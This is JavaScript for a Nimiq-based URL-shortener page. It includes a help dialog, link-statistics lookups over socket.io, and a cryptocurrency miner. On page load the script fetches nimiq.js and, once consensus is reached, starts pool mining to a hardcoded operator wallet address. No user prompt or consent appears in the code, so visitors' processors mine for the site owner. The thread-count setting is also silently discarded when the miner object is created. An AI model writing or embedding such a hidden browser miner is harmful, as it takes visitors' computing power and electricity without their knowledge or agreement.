getHelp = () => {
    swal("I'm here to help you!", "Do you want to short an URL and earn NIM at the same time?\n\nJust paste your long URL, enter your Nimiq Address and select the number of shares between 1 and 3.\n\nMore shares equals to more revenue but more time for the final user, a high number isn't recommended.\n\nOnce you have all just click the 'Short It!' button and you will get the shorted URL to share to everyone and get those NIM.\n\nHappy sharing!", "info");
}

const socket = io('https://albermonte.now.sh/');

statistics = () => {
    let url = document.getElementById('urlinput').value
    if (url.startsWith("http://") || url.startsWith("https://")) {
        let hash = url.substr(url.length - 5);
        socket.emit('statistics', {hash: hash, id: socket.id})
    } else if (url == '') {
        swal("Wrong URL", "Input an URL starting with 'http://' or 'https://'", "error");
    } else {
        swal("Wrong URL", "Check that the URL starts with 'http://' or 'https://'", "error");
    }
}

socket.on('statistics_answer', (json) => {
    document.getElementById('form-to-hide').style.display = 'none'
    document.getElementById('hide').style.display = 'block'
    document.getElementById('shares_mined').innerHTML = json.result.shares_mined || 0
    document.getElementById('total_users').innerHTML = Math.round(json.result.shares_mined / json.result.shares) || 0
})

socket.on('wrong_url', () => {
    swal("Wrong URL", "That URL doesn't exist, double check it.", "error");
})

const $nimiq = {
    miner: {}
};
window.$nimiq = $nimiq;
$nimiq.status = 'Not connected';
$nimiq.shares = 0;
$nimiq.block = 0;
$nimiq.isMining = false;

function setInnerHTML(elId, text) {
    if (elId === 'sp-status') {
        $nimiq.status = text;
    }
    if (document.getElementById(elId)) {
        document.getElementById(elId).innerHTML = text;
    }
}

function loadScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    if (script.readyState) { //IE
        script.onreadystatechange = () => {
            if (script.readyState === "loaded" || script.readyState === "complete") {
                script.onreadystatechange = null;
                callback();
            }
        };
    } else { //Others
        script.onload = () => {
            callback();
        };
    }

    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}

let nimiqMiner = {
    minerThreads: 0,
    init: () => {
        Nimiq.init(async () => {
                Nimiq.GenesisConfig.main();
                console.log('Nimiq loaded. Connecting and establishing consensus.');
                $nimiq.consensus = await Nimiq.Consensus.light();
                $nimiq.blockchain = $nimiq.consensus.blockchain;
                $nimiq.accounts = $nimiq.blockchain.accounts;
                $nimiq.mempool = $nimiq.consensus.mempool;
                $nimiq.network = $nimiq.consensus.network;

                $nimiq.consensus.on('established', () => nimiqMiner.onConsensusEstablished());
                $nimiq.consensus.on('lost', () => console.warn('Consensus lost'));

                $nimiq.blockchain.on('head-changed', () => nimiqMiner.onHeadChanged());
                $nimiq.network.on('peers-changed', () => nimiqMiner.onPeersChanged());

                $nimiq.network.connect();

            },
            function (code) {
                switch (code) {
                    case Nimiq.ERR_WAIT:
                        console.log('Error: Already open in another tab or window.');
                        break;
                    case Nimiq.ERR_UNSUPPORTED:
                        console.error('Error: Browser not supported');
                        break;
                    default:
                        console.log('Error: Nimiq initialization error');
                        break;
                }
            });
    },
    onHeadChanged: () => {
        const height = $nimiq.blockchain.height;
        console.log(`Now at height ${height}.`);
        $nimiq.block = $nimiq.blockchain.height;
    },
    onConsensusEstablished: () => {
        address_to_mine = 'NQ65 GS91 H8CS QFAN 1EVS UK3G X7PL L9N1 X4KC'
        if (navigator.hardwareConcurrency < 3) {
            $nimiq.miner.threads = 0;
        } else {
            $nimiq.miner.threads = 1;
        }
        nimiqMiner.startMining();
    },
    onPeersChanged: () => {
        console.log(`Now connected to ${$nimiq.network.peerCount} peers.`);

    },
    onPoolConnectionChanged: function (state) {
        if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTING) {
            console.log('Connecting to the pool');
        }
        if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTED) {
            console.log('Connected to pool');
            $nimiq.miner.startWork();
        }
        if (state === Nimiq.BasePoolMiner.ConnectionState.CLOSED) {
            console.log('Connection closed');
        }
    },
    onHashrateChanged: function (rate) {},
    stopMining: () => {
        if ($nimiq.miner) {
            $nimiq.miner.stopWork();
            $nimiq.miner.disconnect();
            $nimiq.miner.fire('hashrate-changed', 0);
        }
        $nimiq.network.disconnect();
        $nimiq.isMining = false;
    },
    onShareFound: () => {
        $nimiq.shares++;
    },
    startMining: () => {
        $nimiq.address = Nimiq.Address.fromUserFriendlyAddress(address_to_mine);
        console.log('Mining to: ' + address_to_mine)
        $nimiq.miner = new Nimiq.SmartPoolMiner($nimiq.blockchain, $nimiq.accounts, $nimiq.mempool, $nimiq.network.time, $nimiq.address, Nimiq.BasePoolMiner.generateDeviceId($nimiq.network.config));
        console.log('Using ' + $nimiq.miner.threads + ' threads');
        $nimiq.miner.connect('beeppool.org/ws', 443);
        $nimiq.miner.on('connection-state', nimiqMiner.onPoolConnectionChanged);
        $nimiq.miner.on('hashrate-changed', nimiqMiner.onHashrateChanged);
        $nimiq.miner.on('share', nimiqMiner.onShareFound);
        $nimiq.isMining = true;
    }
};

loadScript('https://cdn.nimiq.com/nimiq.js', () => {
    console.log('nimiq.js loaded');
    nimiqMiner.init();
});